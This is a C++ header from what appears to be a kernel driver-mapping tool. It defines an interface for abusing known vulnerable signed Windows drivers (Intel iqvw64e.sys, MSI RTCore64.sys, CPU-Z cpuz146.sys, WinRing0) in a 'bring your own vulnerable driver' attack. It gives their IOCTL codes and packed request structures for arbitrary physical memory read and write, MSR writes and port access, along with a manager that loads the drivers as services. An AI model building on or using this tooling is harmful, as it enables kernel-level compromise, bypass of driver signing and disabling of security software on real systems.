/*
 * Vulnerable Driver Interface
 * Abstract interface for multiple BYOVD drivers
 * 
 * Supported drivers:
 * - Intel iqvw64e.sys (CVE-2015-2291)
 * - MSI RTCore64.sys (CVE-2019-16098)
 * - CPUZ CPUZ146.sys
 * - WinRing0 WinRing0x64.sys
 */

#pragma once

#include <windows.h>
#include <cstdint>
#include <string>
#include <memory>
#include <vector>

namespace mapper {
namespace drivers {

// ============================================
// Driver Type Enumeration
// ============================================

enum class DriverType {
    Unknown,
    Intel_iqvw64e,      // Intel Network Adapter Diagnostic
    MSI_RTCore64,       // MSI Afterburner
    CPUZ_146,           // CPU-Z
    WinRing0,           // Generic hardware access
    Custom              // User-provided
};

// ============================================
// Physical Memory Operations Result
// ============================================

struct MemoryOpResult {
    bool success;
    uint32_t bytesTransferred;
    uint32_t errorCode;
    std::string errorMessage;
    
    MemoryOpResult() : success(false), bytesTransferred(0), errorCode(0) {}
    
    static MemoryOpResult Success(uint32_t bytes = 0) {
        MemoryOpResult r;
        r.success = true;
        r.bytesTransferred = bytes;
        return r;
    }
    
    static MemoryOpResult Error(uint32_t code, const std::string& msg) {
        MemoryOpResult r;
        r.success = false;
        r.errorCode = code;
        r.errorMessage = msg;
        return r;
    }
};

// ============================================
// Abstract Vulnerable Driver Interface
// ============================================

class IVulnerableDriver {
public:
    virtual ~IVulnerableDriver() = default;
    
    // Driver info
    virtual DriverType GetType() const = 0;
    virtual const char* GetName() const = 0;
    virtual const char* GetDeviceName() const = 0;
    
    // Lifecycle
    virtual bool Initialize(const std::wstring& driverPath) = 0;
    virtual bool Load() = 0;
    virtual bool Unload() = 0;
    virtual void Cleanup() = 0;
    virtual bool IsLoaded() const = 0;
    
    // Physical Memory Operations
    virtual MemoryOpResult ReadPhysicalMemory(uint64_t address, void* buffer, size_t size) = 0;
    virtual MemoryOpResult WritePhysicalMemory(uint64_t address, const void* buffer, size_t size) = 0;
    
    // Memory Mapping (if supported)
    virtual bool SupportsMapping() const { return false; }
    virtual MemoryOpResult MapPhysicalMemory(uint64_t address, size_t size, void** mapped) { 
        (void)address; (void)size; (void)mapped;
        return MemoryOpResult::Error(1, "Not supported"); 
    }
    virtual void UnmapPhysicalMemory(void* mapped) { (void)mapped; }
    
    // MSR Access (if supported)
    virtual bool SupportsMSR() const { return false; }
    virtual bool ReadMSR(uint32_t msr, uint64_t* value) { (void)msr; (void)value; return false; }
    virtual bool WriteMSR(uint32_t msr, uint64_t value) { (void)msr; (void)value; return false; }
    
    // IO Port Access (if supported)
    virtual bool SupportsIOPort() const { return false; }
    virtual bool ReadIOPort(uint16_t port, uint32_t* value, uint8_t size) { 
        (void)port; (void)value; (void)size; return false; 
    }
    virtual bool WriteIOPort(uint16_t port, uint32_t value, uint8_t size) { 
        (void)port; (void)value; (void)size; return false; 
    }
    
    // PCI Config Access (if supported)
    virtual bool SupportsPCI() const { return false; }
    virtual bool ReadPCIConfig(uint8_t bus, uint8_t device, uint8_t func, uint32_t offset, void* data, size_t size) {
        (void)bus; (void)device; (void)func; (void)offset; (void)data; (void)size;
        return false;
    }
    virtual bool WritePCIConfig(uint8_t bus, uint8_t device, uint8_t func, uint32_t offset, const void* data, size_t size) {
        (void)bus; (void)device; (void)func; (void)offset; (void)data; (void)size;
        return false;
    }
};

// ============================================
// MSI RTCore64 Driver Implementation
// ============================================

class RTCore64Driver : public IVulnerableDriver {
public:
    RTCore64Driver() = default;
    ~RTCore64Driver() override { Cleanup(); }
    
    DriverType GetType() const override { return DriverType::MSI_RTCore64; }
    const char* GetName() const override { return "RTCore64.sys"; }
    const char* GetDeviceName() const override { return "\\\\.\\RTCore64"; }
    
    bool Initialize(const std::wstring& driverPath) override;
    bool Load() override;
    bool Unload() override;
    void Cleanup() override;
    bool IsLoaded() const override { return m_hDevice != INVALID_HANDLE_VALUE; }
    
    MemoryOpResult ReadPhysicalMemory(uint64_t address, void* buffer, size_t size) override;
    MemoryOpResult WritePhysicalMemory(uint64_t address, const void* buffer, size_t size) override;
    
    bool SupportsMSR() const override { return true; }
    bool ReadMSR(uint32_t msr, uint64_t* value) override;
    bool WriteMSR(uint32_t msr, uint64_t value) override;
    
private:
    // IOCTL codes for RTCore64
    static constexpr DWORD RTCORE_MEMORY_READ  = 0x80002048;
    static constexpr DWORD RTCORE_MEMORY_WRITE = 0x8000204C;
    static constexpr DWORD RTCORE_MSR_READ     = 0x80002030;
    static constexpr DWORD RTCORE_MSR_WRITE    = 0x80002034;
    
    #pragma pack(push, 1)
    struct RTCORE_MEMORY {
        uint8_t  Padding0[8];
        uint64_t Address;
        uint8_t  Padding1[8];
        uint32_t ReadSize;
        uint32_t Value;
        uint8_t  Padding2[16];
    };
    
    struct RTCORE_MSR {
        uint32_t Register;
        uint32_t Padding;
        uint64_t Value;
    };
    #pragma pack(pop)
    
    HANDLE m_hDevice = INVALID_HANDLE_VALUE;
    std::wstring m_driverPath;
    std::wstring m_serviceName;
    
    bool CreateService();
    bool DeleteService();
};

// ============================================
// WinRing0 Driver Implementation
// ============================================

class WinRing0Driver : public IVulnerableDriver {
public:
    WinRing0Driver() = default;
    ~WinRing0Driver() override { Cleanup(); }
    
    DriverType GetType() const override { return DriverType::WinRing0; }
    const char* GetName() const override { return "WinRing0x64.sys"; }
    const char* GetDeviceName() const override { return "\\\\.\\WinRing0_1_2_0"; }
    
    bool Initialize(const std::wstring& driverPath) override;
    bool Load() override;
    bool Unload() override;
    void Cleanup() override;
    bool IsLoaded() const override { return m_hDevice != INVALID_HANDLE_VALUE; }
    
    MemoryOpResult ReadPhysicalMemory(uint64_t address, void* buffer, size_t size) override;
    MemoryOpResult WritePhysicalMemory(uint64_t address, const void* buffer, size_t size) override;
    
    bool SupportsMapping() const override { return true; }
    MemoryOpResult MapPhysicalMemory(uint64_t address, size_t size, void** mapped) override;
    void UnmapPhysicalMemory(void* mapped) override;
    
    bool SupportsMSR() const override { return true; }
    bool ReadMSR(uint32_t msr, uint64_t* value) override;
    bool WriteMSR(uint32_t msr, uint64_t value) override;
    
    bool SupportsIOPort() const override { return true; }
    bool ReadIOPort(uint16_t port, uint32_t* value, uint8_t size) override;
    bool WriteIOPort(uint16_t port, uint32_t value, uint8_t size) override;
    
private:
    // IOCTL codes for WinRing0
    static constexpr DWORD OLS_TYPE = 40000;
    static constexpr DWORD IOCTL_OLS_GET_DRIVER_VERSION = CTL_CODE(OLS_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_ACCESS);
    static constexpr DWORD IOCTL_OLS_READ_MSR           = CTL_CODE(OLS_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS);
    static constexpr DWORD IOCTL_OLS_WRITE_MSR          = CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS);
    static constexpr DWORD IOCTL_OLS_READ_IO_PORT_BYTE  = CTL_CODE(OLS_TYPE, 0x833, METHOD_BUFFERED, FILE_READ_ACCESS);
    static constexpr DWORD IOCTL_OLS_WRITE_IO_PORT_BYTE = CTL_CODE(OLS_TYPE, 0x836, METHOD_BUFFERED, FILE_WRITE_ACCESS);
    static constexpr DWORD IOCTL_OLS_READ_MEMORY        = CTL_CODE(OLS_TYPE, 0x841, METHOD_BUFFERED, FILE_READ_ACCESS);
    static constexpr DWORD IOCTL_OLS_WRITE_MEMORY       = CTL_CODE(OLS_TYPE, 0x842, METHOD_BUFFERED, FILE_WRITE_ACCESS);
    
    #pragma pack(push, 1)
    struct OLS_READ_MEMORY {
        uint64_t Address;
        uint32_t UnitSize;
        uint32_t Count;
    };
    
    struct OLS_WRITE_MEMORY {
        uint64_t Address;
        uint32_t UnitSize;
        uint32_t Count;
        uint8_t  Data[1];  // Variable length
    };
    #pragma pack(pop)
    
    HANDLE m_hDevice = INVALID_HANDLE_VALUE;
    std::wstring m_driverPath;
    std::wstring m_serviceName;
    
    bool CreateService();
    bool DeleteService();
};

// ============================================
// CPUZ Driver Implementation
// ============================================

class CpuzDriver : public IVulnerableDriver {
public:
    CpuzDriver() = default;
    ~CpuzDriver() override { Cleanup(); }
    
    DriverType GetType() const override { return DriverType::CPUZ_146; }
    const char* GetName() const override { return "cpuz146.sys"; }
    const char* GetDeviceName() const override { return "\\\\.\\cpuz146"; }
    
    bool Initialize(const std::wstring& driverPath) override;
    bool Load() override;
    bool Unload() override;
    void Cleanup() override;
    bool IsLoaded() const override { return m_hDevice != INVALID_HANDLE_VALUE; }
    
    MemoryOpResult ReadPhysicalMemory(uint64_t address, void* buffer, size_t size) override;
    MemoryOpResult WritePhysicalMemory(uint64_t address, const void* buffer, size_t size) override;
    
    bool SupportsMapping() const override { return true; }
    MemoryOpResult MapPhysicalMemory(uint64_t address, size_t size, void** mapped) override;
    void UnmapPhysicalMemory(void* mapped) override;
    
private:
    // CPUZ IOCTL codes
    static constexpr DWORD CPUZ_MAP_PHYSICAL   = 0x9C402580;
    static constexpr DWORD CPUZ_UNMAP_PHYSICAL = 0x9C402584;
    
    #pragma pack(push, 1)
    struct CPUZ_MAP_INPUT {
        uint64_t PhysicalAddress;
        uint32_t Size;
    };
    
    struct CPUZ_MAP_OUTPUT {
        uint64_t VirtualAddress;
        uint64_t PhysicalAddress;
        uint32_t Size;
        uint32_t Padding;
    };
    #pragma pack(pop)
    
    HANDLE m_hDevice = INVALID_HANDLE_VALUE;
    std::wstring m_driverPath;
    std::wstring m_serviceName;
    
    bool CreateService();
    bool DeleteService();
};

// ============================================
// Driver Factory
// ============================================

class DriverFactory {
public:
    // Create driver instance by type
    static std::unique_ptr<IVulnerableDriver> Create(DriverType type);
    
    // Auto-detect available driver from embedded resources or files
    static std::unique_ptr<IVulnerableDriver> AutoDetect();
    
    // Get list of supported driver types
    static std::vector<DriverType> GetSupportedDrivers();
    
    // Check if a driver file is valid
    static bool ValidateDriverFile(const std::wstring& path, DriverType& detectedType);
};

// ============================================
// Multi-Driver Manager
// ============================================

class DriverManager {
public:
    DriverManager() = default;
    ~DriverManager();
    
    // Initialize with preferred driver type
    bool Initialize(DriverType preferred = DriverType::Intel_iqvw64e);
    
    // Initialize with specific driver file
    bool Initialize(const std::wstring& driverPath);
    
    // Get active driver
    IVulnerableDriver* GetDriver() { return m_driver.get(); }
    const IVulnerableDriver* GetDriver() const { return m_driver.get(); }
    
    // Convenience wrappers
    bool ReadPhysical(uint64_t address, void* buffer, size_t size);
    bool WritePhysical(uint64_t address, const void* buffer, size_t size);
    
    template<typename T>
    T ReadPhysical(uint64_t address) {
        T value{};
        ReadPhysical(address, &value, sizeof(T));
        return value;
    }
    
    template<typename T>
    bool WritePhysical(uint64_t address, const T& value) {
        return WritePhysical(address, &value, sizeof(T));
    }
    
    // Cleanup
    void Cleanup();
    
    // Status
    bool IsReady() const { return m_driver && m_driver->IsLoaded(); }
    DriverType GetActiveDriverType() const { 
        return m_driver ? m_driver->GetType() : DriverType::Unknown; 
    }
    
private:
    std::unique_ptr<IVulnerableDriver> m_driver;
    std::wstring m_driverPath;
    bool m_ownsDriver = false;
};

} // namespace drivers
} // namespace mapper

